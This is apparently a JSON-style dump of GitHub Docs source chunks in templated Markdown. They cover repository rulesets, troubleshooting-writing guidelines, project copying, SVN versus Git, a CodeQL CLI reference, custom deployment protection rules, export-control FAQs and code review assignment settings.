\"Rulesets\" page, you can view the active rulesets targeting a certain branch or tag. {% ifversion repo-rules-enterprise %}You will also see rulesets running in \"Evaluate\" mode, which are not enforced.{% endif %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.navigate-to-branches %}\n1. To the left of the branch, click {% octicon \"shield-lock\" aria-label=\"This branch is protected\" %}.\n\n   !Screenshot of a list of branches in a repository. Next to the \"main\" branch, an icon of a shield with a keyhole is highlighted with an orange outline.\n1. Optionally, to view the rulesets for another branch or tag, use the branch selector dropdown menu.\n\n   !Screenshot of the \"Rulesets\" page. Above a ruleset, a dropdown menu, labeled with a branch icon and \"team-test,\" is highlighted with an orange outline.\n1. Click the name of the ruleset you want to view.\n\n\n\nEditing a ruleset\n\n{% ifversion repo-rules-enterprise %}\n{% note %}\n\n**Note:** If a ruleset was created at the organization level, you cannot edit the ruleset from the repository's settings. If you have permission to edit the ruleset, you can do so in your organization's settings. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n{% endif %}\n\n{% data reusables.repositories.about-editing-rulesets %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n{% data reusables.repositories.repo-rulesets-settings %}\n{% data reusables.repositories.edit-ruleset-steps %}\n\n\n\nDeleting a ruleset\n\n{% data reusables.repositories.deleting-ruleset-tip %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n{% data reusables.repositories.repo-rulesets-settings %}\n{% data reusables.repositories.delete-ruleset-steps %}\n\n{% ifversion repo-rules-management %}\n\n", "Y2h1bmtfMV9pbmRleF8xNzM1": "\n\nUsing ruleset history\n\n{% data reusables.repositories.ruleset-beta-note %}\n\n{% data reusables.repositories.ruleset-history-conceptual %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n{% data reusables.repositories.repo-rulesets-settings %}\n{% data reusables.repositories.ruleset-history %}\n\n\n\nImporting a ruleset\n\n{% data reusables.repositories.import-a-ruleset-conceptual %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n{% data reusables.repositories.repo-rulesets-settings %}\n{% data reusables.repositories.import-a-ruleset %}\n\n{% endif %}\n\n{% ifversion repo-rules-enterprise %}\n\n\n\nViewing insights for rulesets\n\nYou can view insights for rulesets to see how rulesets are affecting a repository. {% data reusables.repositories.about-ruleset-insights %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n1. In the left sidebar, under \"Code and automation,\" click **Rules**, then click **Insights**.\n\n   !Screenshot of the sidebar of the \"Settings\" page for a repository. The \"Rules\" sub-menu is expanded, and the \"Insights\" option is outlined in orange.\n1. On the \"Rule Insights\" page, use the dropdown menus at the top of the page to filter the actions by ruleset, branch, actor, and time period.\n{% data reusables.repositories.rulesets-view-rule-runs %}\n\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xMTAx": "\n\nKnown issues\n\nKnown issues are a subset of troubleshooting content specifically designed to respond to bugs, UX/UI issues, and other product quirks that generate a high volume of support tickets. Where troubleshooting content can describe errors that people _might_ encounter, known issues explain problems that people _will_ encounter.\n\nLike all troubleshooting content, known issues can be a section in an article or a standalone article. If a known issue applies to a specific article, document it in that article. If a known issue applies to a specific set of articles or conceptual grouping of features, or if a product or feature has multiple known issues that should be grouped together, create a dedicated \"Known issues with NAME\" article.\n\nKnown issue content for a product or feature does not need to be comprehensive. Unlike other troubleshooting content, some known issues may not have workarounds. The goal of documenting an issue without a workaround is to help people confirm that the issue exists and save them time searching for a solution that doesn't exist yet after {% data variables.product.prodname_dotcom %} has already determined there isn't a workaround.\n\nProduct and feature owners (PMs and EMs) should help plan and review known issue content.\n\nUse known issues to explain the following situations.\n\n- Product behavior that regularly contradicts people's expectations, but is not yet prioritized for remediation.\n- Behavior that regularly prevents the use of the product or feature for a common purpose.\n- Rare or severe bugs that {% data variables.product.prodname_dotcom %} has not yet prioritized fixing, and that are not explained in the product or by existing content on {% data variables.product.prodname_docs %}.\n\n\n\nHow to write troubleshooting content\n\n- Use any {% data variables.product.prodname_docs %} content type to create troubleshooting sections.\n- Whenever possible, keep troubleshooting content contained within procedural content or guides.\n- You can create a troubleshooting article when it makes se", "Y2h1bmtfMV9pbmRleF8xMTAx": "nse to keep it separate, such as when there\u2019s a large amount of troubleshooting content on a particular topic.\n- You can create a troubleshooting map topic if a product or feature has many troubleshooting articles, for example \"AUTOTITLE.\"\n\n\n\nTitle guidelines for troubleshooting content\n\n- Troubleshooting FEATURE\n- Error: ERROR NAME\n- Known issues for PRODUCT\n\n\n\nExamples of troubleshooting content\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"Known issues\" in the {% data variables.product.prodname_ghe_server %} release notes\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xMzg3": "\n\nAbout copying projects\n\nYou can copy an existing project and use it as a template to save time configuring your views and custom fields.\n\nWhen you copy a project, the new project will contain the same {% data reusables.projects.what-gets-copied %}. {% ifversion projects-v2-org-templates-improvements %}The new project will not contain the original project's items, collaborators, or team and repository links.{% else %}The new project will not contain the original project's items, workflows, insights, collaborators, or team and repository links.{% endif %}\n\n{% ifversion projects-v2-org-templates %}{% data reusables.projects.org-templates %}{% endif %}\n\n\n\nCopying an existing project\n\n1. Navigate to the project you want to copy.\n1. In the top-right, click {% octicon \"kebab-horizontal\" aria-label=\"More options\" %} to open the menu.\n\n   !Screenshot showing a project's menu bar. The menu icon is highlighted with an orange outline.\n\n1. In the menu, click {% octicon \"copy\" aria-hidden=\"true\" %} **Make a copy**.  \n1. Optionally, if you want all draft issues to be copied with the project, in the \"Make a copy\" dialog, select **Draft issues will be copied if selected**.{%- ifversion projects-v2-org-templates-improvements %}{%- else %}\n  \n   !Screenshot showing the \"Make a copy\" form.\n  \n{%- endif %}\n1. Under \"Owner\", select either the organization that will own the new project or your personal account.\n1. Under \"New project name\", type the name of the new project.\n1. Click **Copy project**.\n\n", "Y2h1bmtfMF9pbmRleF8xMzA4": "\n\nDirectory structure\n\nEach _reference_, or labeled snapshot of a commit, in a project is organized within specific subdirectories, such as `trunk`, `branches`, and `tags`. For example, an SVN project with two features under development might look like this:\n\n      sample_project/trunk/README.md\n      sample_project/trunk/lib/widget.rb\n      sample_project/branches/new_feature/README.md\n      sample_project/branches/new_feature/lib/widget.rb\n      sample_project/branches/another_new_feature/README.md\n      sample_project/branches/another_new_feature/lib/widget.rb\n\nAn SVN workflow looks like this:\n\n- The `trunk` directory represents the latest stable release of a project.\n- Active feature work is developed within subdirectories under `branches`.\n- When a feature is finished, the feature directory is merged into `trunk` and removed.\n\nGit projects are also stored within a single directory. However, Git obscures the details of its references by storing them in a special _.git_ directory. For example, a Git project with two features under development might look like this:\n\n      sample_project/.git\n      sample_project/README.md\n      sample_project/lib/widget.rb\n\nA Git workflow looks like this:\n\n- A Git repository stores the full history of all of its branches and tags within the _.git_ directory.\n- The latest stable release is contained within the default branch.\n- Active feature work is developed in separate branches.\n- When a feature is finished, the feature branch is merged into the default branch and deleted.\n\nUnlike SVN, with Git the directory structure remains the same, but the contents of the files change based on your branch.\n\n\n\nIncluding subprojects\n\nA _subproject_ is a project that's developed and managed somewhere outside of your main project. You typically import a subproject to add some functionality to your project without needing to maintain the code yourself. Whenever the subproject is updated, you can synchronize it with your project to ensure that everything is up-to-date.\n\nIn SVN, a subproject is ", "Y2h1bmtfMV9pbmRleF8xMzA4": "called an _SVN external_. In Git, it's called a _Git submodule_. Although conceptually similar, Git submodules are not kept up-to-date automatically; you must explicitly ask for a new version to be brought into your project.\n\nFor more information, see \"Git Tools Submodules\" in the Git documentation.\n\n\n\nPreserving history\n\nSVN is configured to assume that the history of a project never changes. Git allows you to modify previous commits and changes using tools like `git rebase`.\n\n{% tip %}\n\nGitHub supports Subversion clients, which may produce some unexpected results if you're using both Git and SVN on the same project. If you've manipulated Git's commit history, those same commits will always remain within SVN's history. If you accidentally committed some sensitive data, we have an article that will help you remove it from Git's history.\n\n{% endtip %}\n\n{% data reusables.subversion.sunset %}\n\n\n\nFurther reading\n\n- \"Branching and Merging\" from the _Git SCM_ book\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF84Mjg=": "\n\nSynopsis\n\n```shell copy\ncodeql pack resolve-dependencies ... -- \n```\n\n\n\nDescription\n\n\\[Experimental] \\[Plumbing] Compute the set of required dependencies\nfor this QL pack.\n\nThis command searches the configured registries for required\ndependencies and returns the list of resolved dependencies.\n\nAvailable since `v2.6.0`.\n\n\n\nOptions\n\n\n\nPrimary Options\n\n\n\n`<dir>`\n\nThe root directory of the package.\n\n\n\n`--format=<fmt>`\n\nSelect output format, either `text` _(default)_ or `json`.\n\n\n\n`--mode=<mode>`\n\nSpecifies how to resolve dependencies:\n\n`minimal-update` _(default)_: Update or create the codeql-pack.lock.yml\nbased on the existing contents of the qlpack.yml file. If any existing\ncodeql-pack.lock.yml does not satisfy the current dependencies in the\nqlpack.yml, the lock file will be updated as necessary.\n\n`upgrade`: Update or create the codeql-pack.lock.yml to use the latest\nversions of all dependencies, subject to the constraints in the\nqlpack.yml file.\n\n`verify`: Verify that the existing codeql-pack.lock.yml is still valid\nwith respect to the dependencies specified in the qlpack.yml file, or\nfail the lock file if it does not exist.\n\n`no-lock`: Ignore the existing codeql-pack.lock.yml and perform\nresolution based on qlpack.yml file. Does not create or update the lock\nfile.\n\n`use-lock`: Use the existing codeql-pack.lock.yml file to resolve\ndependencies, or create the lock file if it does not exist.\n\n`update`: \\[Deprecated] Update or create the codeql-pack.lock.yml to\nuse the latest versions of all dependencies, subject to the constraints\nin the qlpack.yml file. Equivalent to 'upgrade'\n\n\n\n`--[no-]allow-prerelease`\n\nAllow packs with pre-release version qualifiers (e.g.,\n`X.Y.Z-qualifier`) to be used. Without this flag, pre-release packs will\nbe ignored.\n\nAvailable since `v2.11.3`.\n\n\n\n`--no-strict-mode`\n\n\\[Advanced] Turn off strict mode to avoid a warning when resolving\npackages from the `--additional-packs`\n\nand other locally resolved locations. Packages resolved locally are\nnever downloaded\n\nand will not be added to the ", "Y2h1bmtfMV9pbmRleF84Mjg=": "package lock.\n\n\n\n`--lock-override=<file>`\n\n\\[Advanced] Specifies an alternate lock file to use as the input to\ndependency resolution.\n\n\n\n`--lock-output=<file>`\n\n\\[Advanced] Specifies an alternate location to save the lock file\ngenerated by dependency resolution.\n\nAvailable since `v2.14.1`.\n\n\n\nOptions for resolving QL packs outside of the package registry\n\n\n\n`--search-path=<dir>[:<dir>...]`\n\nA list of directories under which QL packs may be found. Each directory\ncan either be a QL pack (or bundle of packs containing a\n`.codeqlmanifest.json` file at the root) or the immediate parent of one\nor more such directories.\n\nIf the path contains more than one directory, their order defines\nprecedence between them: when a pack name that must be resolved is\nmatched in more than one of the directory trees, the one given first\nwins.\n\nPointing this at a checkout of the open-source CodeQL repository ought\nto work when querying one of the languages that live there.\n\nIf you have checked out the CodeQL repository as a sibling of the\nunpacked CodeQL toolchain, you don't need to give this option; such\nsibling directories will always be searched for QL packs that cannot be\nfound otherwise. (If this default does not work, it is strongly\nrecommended to set up `--search-path` once and for all in a per-user\nconfiguration file).\n\n(Note: On Windows the path separator is `;`).\n\n\n\n`--additional-packs=<dir>[:<dir>...]`\n\nIf this list of directories is given, they will be searched for packs\nbefore the ones in `--search-path`. The order between these doesn't\nmatter; it is an error if a pack name is found in two different places\nthrough this list.\n\nThis is useful if you're temporarily developing a new version of a pack\nthat also appears in the default path. On the other hand, it is _not\nrecommended_ to override this option in a config file; some internal\nactions will add this option on the fly, overriding any configured\nvalue.\n\n(Note: On Windows the path separator is `;`).\n\n\n\nOptions for configuring the CodeQL package manager\n\n\n\n`--registries-auth-", "Y2h1bmtfMl9pbmRleF84Mjg=": "stdin`\n\nAuthenticate to GitHub Enterprise Server Container registries by passing\na comma-separated list of \\=\\ pairs.\n\nFor example, you can pass\n`https://containers.GHEHOSTNAME1/v2/=TOKEN1,https://containers.GHEHOSTNAME2/v2/=TOKEN2`\nto authenticate to two GitHub Enterprise Server instances.\n\nThis overrides the CODEQL\\_REGISTRIES\\_AUTH and GITHUB\\_TOKEN environment\nvariables. If you only need to authenticate to the github.com Container\nregistry, you can instead authenticate using the simpler\n`--github-auth-stdin` option.\n\n\n\n`--github-auth-stdin`\n\nAuthenticate to the github.com Container registry by passing a\ngithub.com GitHub Apps token or personal access token via standard\ninput.\n\nTo authenticate to GitHub Enterprise Server Container registries, pass\n`--registries-auth-stdin` or use the CODEQL\\_REGISTRIES\\_AUTH environment\nvariable.\n\nThis overrides the GITHUB\\_TOKEN environment variable.\n\n\n\nCommon options\n\n\n\n`-h, --help`\n\nShow this help text.\n\n\n\n`-J=<opt>`\n\n\\[Advanced] Give option to the JVM running the command.\n\n(Beware that options containing spaces will not be handled correctly.)\n\n\n\n`-v, --verbose`\n\nIncrementally increase the number of progress messages printed.\n\n\n\n`-q, --quiet`\n\nIncrementally decrease the number of progress messages printed.\n\n\n\n`--verbosity=<level>`\n\n\\[Advanced] Explicitly set the verbosity level to one of errors,\nwarnings, progress, progress+, progress++, progress+++. Overrides `-v`\nand `-q`.\n\n\n\n`--logdir=<dir>`\n\n\\[Advanced] Write detailed logs to one or more files in the given\ndirectory, with generated names that include timestamps and the name of\nthe running subcommand.\n\n(To write a log file with a name you have full control over, instead\ngive `--log-to-stderr` and redirect stderr as desired.)\n\n\n\n`--common-caches=<dir>`\n\n\\[Advanced] Controls the location of cached data on disk that will\npersist between several runs of the CLI, such as downloaded QL packs and\ncompiled query plans. If not set explicitly, this defaults to a\ndirectory named `.codeql` in the user's home directory; it will be\ncr", "Y2h1bmtfM19pbmRleF84Mjg=": "eated if it doesn't already exist.\n\nAvailable since `v2.15.2`.\n\n", "Y2h1bmtfMF9pbmRleF85OQ==": "\n\nAbout custom deployment protection rules\n\n{% data reusables.actions.about-custom-deployment-protection-rules %}\n\nCustom deployment protection rules are powered by {% data variables.product.prodname_github_apps %} and run based on webhooks and callbacks. Approval or rejection of a workflow job is based on consumption of the `deployment_protection_rule` webhook. For more information, see \"AUTOTITLE\" and \"Approving or rejecting deployments.\"\n\nOnce you have created a custom deployment protection rule and installed it on your repository, the custom deployment protection rule will automatically be available for all environments in the repository.\n\n\n\nUsing custom deployment protection rules to approve or reject deployments\n\nDeployments to an environment can be approved or rejected based on the conditions defined in any external service like an approved ticket in an IT Service Management (ITSM) system, vulnerable scan result on dependencies, or stable health metrics of a cloud resource. The decision to approve or reject deployments is at the discretion of the integrating third-party application and the gating conditions you define in them. The following are a few use cases for which you can create a deployment protection rule.\n\n- ITSM & Security Operations: you can check for service readiness by validating quality, security, and compliance processes that verify deployment readiness.\n- Observability systems: you can consult monitoring or observability systems (Asset Performance Management Systems and logging aggregators, cloud resource health verification systems, etc.) for verifying the safety and deployment readiness.\n- Code quality & testing tools: you can check for automated tests on CI builds which need to be deployed to an environment.\n\nAlternatively, you can write your own protection rules for any of the above use cases or you can define any custom logic to safely approve or reject deployments from pre-production to production environments.\n\n\n\nCreating a custom deployment protection rule with {% data variables.pr", "Y2h1bmtfMV9pbmRleF85OQ==": "oduct.prodname_github_apps %}\n\n1. Create a {% data variables.product.prodname_github_app %}. For more information, see \"AUTOTITLE.\" Configure the {% data variables.product.prodname_github_app %} as follows.\n   1. Optionally, in the **Callback URL** text field under \"Identifying and authorizing users,\" enter the callback URL. For more information, see \"AUTOTITLE.\"\n   1. Under \"Permissions,\" select **Repository permissions**.\n   1. To the right of \"Actions,\" click the drop down menu and select **Access: Read-only**.\n   !Screenshot of the \"Repository permissions\" section when creating a new GitHub App. The button to configure permissions, with the \"read-only\" permission selected, for Actions is highlighted by a dark orange rectangle.\n   1. To the right of \"Deployments,\" click the drop down menu and select **Access: Read and write**.\n   !Screenshot of the \"Deployments\" permission settings in the \"Repository permissions\" section while creating a new GitHub App. The button to configure permissions, with the \"read-only\" permission selected, for Deployments is highlighted by a dark orange rectangle.\n   1. Under \"Subscribe to events,\" select **Deployment protection rule**.\n   !Screenshot of the \"Subscribe to events section\" section while creating a new GitHub App. The checkbox to subscribe to the deployment protection rule event is highlighted by a dark orange rectangle.\n\n1. Install the custom deployment protection rule in your repositories and enable it for use. For more information, see \"AUTOTITLE.\"\n\n\n\nApproving or rejecting deployments\n\nOnce a workflow reaches a job that references an environment that has the custom deployment protection rule enabled, {% data variables.product.company_short %} sends a `POST` request to a URL you configure containing the `deployment_protection_rule` payload. You can write your deployment protection rule to automatically send REST API requests that approve or reject the deployment based on the `deployment_protection_rule` payload. Configure your REST API requests as follows.\n\n1. Validate", "Y2h1bmtfMl9pbmRleF85OQ==": " the incoming `POST` request. For more information, see \"AUTOTITLE.\"\n1. Use a JSON Web Token to authenticate as a {% data variables.product.prodname_github_app %}. For more information, see \"AUTOTITLE.\"\n1. Using the installation ID from the `deployment_protection_rule` webhook payload, generate an install token. For more information, see \"AUTOTITLE.\"\n\n   ```shell\n   curl --request POST \\\n   --url \"{% data variables.product.api_url_code %}/app/installations/INSTALLATION_ID/ACCESS_TOKENS\" \\\n   --header \"Accept: application/vnd.github+json\" \\\n   --header \"Authorization: Bearer {jwt}\" \\\n   --header \"Content-Type: application/json\" \\\n   --data \\\n   '{ \\\n      \"repository_ids\": [321], \\\n      \"permissions\": { \\\n         \"deployments\": \"write\" \\\n      } \\\n   }'\n   ```\n\n1. Optionally, to add a status report without taking any other action to {% data variables.product.prodname_dotcom_the_website %}, send a `POST` request to `/repos/OWNER/REPO/actions/runs/RUN_ID/deployment_protection_rule`. In the request body, omit the `state`. For more information, see \"AUTOTITLE.\" You can post a status report on the same deployment up to 10 times. Status reports support Markdown formatting and can be up to 1024 characters long.\n\n1. To approve or reject a request, send a `POST` request to `/repos/OWNER/REPO/actions/runs/RUN_ID/deployment_protection_rule`. In the request body, set the `state` property to either `approved` or `rejected`. For more information, see \"AUTOTITLE.\"\n\n1. Optionally, request the status of an approval for a workflow run by sending a `GET` request to `/repos/OWNER/REPOSITORY_ID/actions/runs/RUN_ID/approvals`. For more information, see \"AUTOTITLE.\"\n\n1. Optionally, review the deployment on {% data variables.product.prodname_dotcom_the_website %}. For more information, see \"AUTOTITLE.\"\n\n{% ifversion fpt or ghec %}\n\n\n\nPublishing custom deployment protection rules in the {% data variables.product.prodname_marketplace %}\n\nYou can publish your {% data variables.product.prodname_github_app %} to the {% data variables.produc", "Y2h1bmtfM19pbmRleF85OQ==": "t.prodname_marketplace %} to allow developers to discover suitable protection rules and install it across their {% data variables.product.company_short %} repositories. Or you can browse existing custom deployment protection rules to suit your needs. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8yMDU4": "\n\nExport overview\n\n\n\nGitHub.com\n\nUnder our Terms of Service, users may only access and use GitHub.com in compliance with applicable law, including U.S. export control and sanctions laws.\n\nUsers are responsible for ensuring that the content they develop and share on GitHub.com complies with the U.S. export control laws, including the EAR and the U.S. International Traffic in Arms Regulations (ITAR). The cloud-hosted service offering available at GitHub.com has not been designed to host data subject to the ITAR and does not currently offer the ability to restrict repository access by country. If you are looking to collaborate on ITAR- or other export-controlled data, we recommend you consider GitHub Enterprise Server, GitHub's on-premises offering.\n\nGitHub now has a license from OFAC to provide cloud services to developers located or otherwise resident in Iran. This includes all public and private services for individuals and organizations, both free and paid.\n\nGitHub cloud services, both free and paid, are also generally available to developers located in Cuba.\n\nSpecially Designated Nationals (SDNs), other denied or blocked parties under U.S. and other applicable law, and certain government officials, may be restricted from accessing or using GitHub.com. Additionally, users may not use GitHub.com for or on behalf of such parties, generally including the Governments of sanctioned countries. Furthermore, GitHub.com may not be used for purposes prohibited under applicable export control laws, including prohibited end uses described in 15 CFR 744.\n\n\n\nGitHub Enterprise Server\n\nGitHub Enterprise Server is a self-hosted virtual appliance that can be run within your own datacenter or virtual private cloud. As such, GitHub Enterprise Server can be used to store ITAR- or other export-controlled information, although, end users are nonetheless responsible for ensuring compliance with the ITAR and other applicable export controls.\n\nGitHub Enterprise Server is a commercial, mass-market product and has been assigned the Export ", "Y2h1bmtfMV9pbmRleF8yMDU4": "Control Classification Number (ECCN) of `5D992.c` and may be exported to most destinations with no license required (NLR).\n\nGitHub Enterprise Server may not be sold to, exported, or re-exported to any country listed in Country Group E:1 in Supplement No. 1 to part 740 of the EAR or to the following regions of Ukraine: Crimea and the separatist areas of Donetsk and Luhansk. The countries listed currently include Cuba, Iran, North Korea, Syria, Russia, and Belarus, but this list is subject to change.\n\n\n\nGitHub Copilot\n\nGitHub Copilot is a commercial, mass-market product and has been assigned the Export Control Classification Number (ECCN) of 5D992.c and may be exported to most destinations with no license required (NLR).\n\nGitHub Copilot may not be sold to, exported, or re-exported to any country listed in Country Group E:1 in Supplement No. 1 to part 740 of the EAR or to the following regions of Ukraine: Crimea and the separatist areas of Donetsk and Luhansk, without authorization. The countries listed currently include Cuba, Iran, North Korea, Syria, Russia, and Belarus, but this list is subject to change.\n\n\n\nFrequently asked questions\n\n\n\nOn which countries and territories are U.S. government sanctions applied?\n\nCrimea, the separatist areas of Donetsk and Luhansk, Cuba, Iran, North Korea, and Syria. With respect to Iran, however, GitHub now has a license from the U.S. Treasury Department's Office of Foreign Assets Control (OFAC) to provide cloud services to developers located or otherwise resident in that country. GitHub cloud services, both free and paid, are also generally available to developers located in Cuba.\n\n\n\nHow is GitHub ensuring that folks not living in and/or having professional links to the sanctioned countries and territories still have access or ability to appeal?\n\nIn the rare instance that an account is affected unintentionally or in error, we have an appeal process to address such instances.\n\nIf an individual user or organization owner believes that they have been flagged in error, then that user", "Y2h1bmtfMl9pbmRleF8yMDU4": " has the opportunity to appeal the flag by providing verification information to GitHub. If GitHub receives sufficient information to verify that the user or organization is not affiliated with a U.S.-sanctioned jurisdiction for which we do not have a license or otherwise restricted by U.S. economic sanctions, then the flag will be removed. Please see individual account appeals request form and organizational account appeals request form.\n\n\n\nWill traveling in these regions be impacted?\n\nTravel in these regions may impact your account status, but availability may be reinstated once you are outside of the sanctioned region and upon submitting a successful individual account appeals request or an organizational account appeals request.\n\n\n\nWhat is available and not available?\n\nGitHub now has a license from OFAC to provide cloud services to developers located or otherwise resident in the U.S.-sanctioned country of Iran. The license includes all public and private services for individuals and organizations, both free and paid. GitHub cloud services, both free and paid, are also generally available to developers located in Cuba.\n\nGitHub is committed to continuing to offer free public repository services to developers with individual and organizational accounts in Syria, Crimea, and the separatist areas of Donetsk and Luhansk. This includes limited access to free services, such as public repositories for open source projects (and associated public Pages), public gists, and allotted free Action minutes, for personal communications only, and not for commercial purposes.\n\nFor paid organizational accounts in these sanctioned regions, users may have limited access to their public repositories, which have been downgraded to archived read-only repositories. For free organizational accounts in these sanctioned regions, however, users will continue to have full access to free public repositories for open source projects (and associated public Pages), public gists, and allotted free Action minutes.\n\nGitHub will continue advocating", "Y2h1bmtfM19pbmRleF8yMDU4": " with U.S. regulators for the greatest possible access to code collaboration services to developers in sanctioned regions, such as Syria and Crimea, including private repositories. We believe that offering those services advances human progress, international communication, and the enduring U.S. foreign policy of promoting free speech and the free flow of information.\n\nSpecially Designated Nationals (SDNs), other denied or blocked parties under U.S. and other applicable law, and certain government officials may be restricted from accessing or using GitHub, wherever located. Users may not use GitHub.com for or on behalf of such parties, generally including the Governments of sanctioned countries.\n\nGitHub services are not available to developers located or otherwise resident in North Korea.  \n\n\n\nHow do you define these specific users?\n\nIf GitHub determines that a user or customer is located in a region that is subject to U.S. trade control restrictions for which GitHub does not yet have a license from the U.S. government, or a user is otherwise restricted under U.S. economic sanctions, then the affiliated account will be restricted to comply with those legal requirements. The determination of user and customer location to implement these legal restrictions are derived from a number of sources, including IP addresses and payment history. Nationality and ethnicity are not used to flag users for sanctions restrictions.\n\n\n\nHow are organization accounts impacted?\n\nIf an organization is based out of, or the key individuals or membership of an organization shows sufficient ties to, a sanctioned territory or country for which GitHub does not yet have a license from the U.S. government, or if the organization otherwise appears to be subject to U.S. economic sanctions, then the organization account and the affiliated owner account will be restricted.\n\nThe restriction suspends access to private repository services and paid services, such as availability of free or paid private repositories, secret gists, paid Action minutes, ", "Y2h1bmtfNF9pbmRleF8yMDU4": "Sponsors, and GitHub Marketplace services. For paid organizational accounts associated with such sanctioned regions, users may have limited access to their public repositories, which have been downgraded to archived read-only repositories. For free organizational accounts associated with such sanctioned regions, users will continue to have full access to free public repositories for open source projects (and associated public Pages), public gists, and allotted free Action minutes.\n\n\n\nCan trade-restricted users\u2019 private repositories be made public?\n\nFree individual account users can make restricted private repositories public, for personal communications only, and not for commercial purposes. Users can do this by navigating to the repository settings tab and clicking the \"make public\" button. Once the repository is public, users have access to public repositories services. This action cannot be undone.\n\n\n\nCan trade-restricted users access private repository data (e.g. downloading or deletion of repository data)?\n\nUnfortunately, our understanding of the law does not give us the option to allow downloads or deletion of private repository content, until otherwise authorized by the U.S. government. We will strongly advocate, with U.S. regulators, for the right of trade-restricted users to secure the contents of their private repositories. We will also advocate for more availability of GitHub services for developers in sanctioned markets, and further underscore the importance of code collaboration in supporting personal communications for developers globally.\n\n\n\nUnder the license GitHub has received from OFAC, which types of accounts will be available in Iran?\n\nThe license we have secured includes all public and private services, for individuals and organizations, both free and paid.\n\nFor example, a developer in Iran may sign up for a Free or Pro plan for their individual use, and an Iranian university may set up an organization account to collaborate with students.\n\nSpecially Designated Nationals (SDNs), other denied ", "Y2h1bmtfNV9pbmRleF8yMDU4": "or blocked parties under U.S. and other applicable law, and certain government officials may be restricted from accessing or using GitHub.\n\nIf GitHub determines that an individual or organization falls into a restricted category (SDNs, other blocked parties, or certain government officials), their account will be flagged and they will not be able to use any GitHub features. If they believe that they have been flagged in error, then they have the opportunity to appeal the flag by providing verification information to GitHub using our individual account appeals request form or organization account appeals request form. If GitHub receives sufficient information to verify that the individual is not in a category restricted by U.S. economic sanctions, then the flag will be removed.\n\n\n\nWill Iranian GitHub users be able to use paid services under the license?\n\nPursuant to the license we have received from OFAC, we are restoring all cloud services to Iranian users, including paid services. We accept all major credit cards, but third parties process payments for us, so payments are subject to the terms and conditions of our payment processors. Those third parties may include restrictions that block payments from Iran.\n\n\n\nCan you clarify availability of GitHub to Cuban developers?\n\nGitHub cloud services, both free and paid, are generally available to developers located in Cuba.  \nSpecially Designated Nationals (SDNs), other denied or blocked parties under U.S. and other applicable law, and certain government officials may be restricted from accessing or using GitHub, wherever located. Additionally, users may not use GitHub.com for or on behalf of such parties, generally including the Governments of sanctioned countries.\n\n", "Y2h1bmtfMF9pbmRleF82NzM=": "\n\nFurther reading\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xODYw": "\n\nAbout {% data variables.product.prodname_codespaces %} repository secrets\n\nYou can create, list, and delete secrets (such as access tokens for cloud services) for repositories that the user has access to. These secrets are made available to the codespace at runtime. For more information, see \"AUTOTITLE.\"\n\n\n\n", "Y2h1bmtfMF9pbmRleF8xNjEw": "\n\nAbout code review settings\n\n{% ifversion only-notify-requested-members %}\nTo reduce noise for your team and clarify individual responsibility for pull request reviews, you can configure code review settings.\n\n- Team notifications\n- Auto assignment\n\n\n\nAbout team notifications\n\nWhen you choose to only notify requested team members, you disable sending notifications to the entire team when the team is requested to review a pull request if a specific member of that team is also requested for review. This is especially useful when a repository is configured with teams as code owners, but contributors to the repository often know a specific individual that would be the correct reviewer for their pull request. For more information, see \"AUTOTITLE.\"\n\n\n\nAbout auto assignment\n\n{% endif %}\n\nWhen you enable auto assignment, any time your team has been requested to review a pull request, the team is removed as a reviewer and a specified subset of team members are assigned in the team's place. Code review assignments allow you to decide whether the whole team or just a subset of team members are notified when a team is requested for review.\n\nWhen code owners are automatically requested for review, the team is still removed and replaced with individuals unless a branch protection rule is configured to require review from code owners. If such a branch protection rule is in place, the team request cannot be removed and so the individual request will appear in addition to the team. Once the individual completes their review, the team is removed.\n\n\n\nRouting algorithms\n\nCode review assignments automatically choose and assign reviewers based on one of two possible algorithms.\n\nThe round robin algorithm chooses reviewers based on who's received the least recent review request, focusing on alternating between all members of the team regardless of the number of outstanding reviews they currently have.\n\nThe load balance algorithm chooses reviewers based on each member's total number of recent review requests and considers the number of", "Y2h1bmtfMV9pbmRleF8xNjEw": " outstanding reviews for each member. The load balance algorithm tries to ensure that each team member reviews an equal number of pull requests in any 30 day period.\n\nAny team members that have set their status to \"Busy\" will not be selected for review. If all team members are busy, the pull request will remain assigned to the team itself. For more information about user statuses, see \"AUTOTITLE.\"\n\n{% ifversion only-notify-requested-members %}\n\n\n\nConfiguring team notifications\n\n{% data reusables.profile.access_org %}\n{% data reusables.user-settings.access_org %}\n{% data reusables.organizations.specific_team %}\n{% data reusables.organizations.team_settings %}\n1. In the left sidebar, click **{% octicon \"code-review\" aria-hidden=\"true\" %} Code review**.\n1. Select **Only notify requested team members.**\n1. Click **Save changes**.\n{% endif %}\n\n\n\nConfiguring auto assignment\n\n{% data reusables.profile.access_org %}\n{% data reusables.user-settings.access_org %}\n{% data reusables.organizations.specific_team %}\n{% data reusables.organizations.team_settings %}\n1. In the left sidebar, click **{% octicon \"code-review\" aria-hidden=\"true\" %} Code review**.\n1. Select **Enable auto assignment**.\n1. Under \"How many team members should be assigned to review?\", select the dropdown menu and choose a number of reviewers to be assigned to each pull request.\n1. Under \"Routing algorithm\", use the dropdown menu and choose which algorithm you'd like to use. For more information, see \"Routing algorithms.\"\n1. Optionally, to always skip certain members of the team, select **Never assign certain team members**. Then, select one or more team members you'd like to always skip.\n1. Optionally, to include members of child teams as potential reviewers when assigning requests, select **Child team members**.\n1. Optionally, to count any members whose review has already been requested against the total number of members to assign, select **Count existing 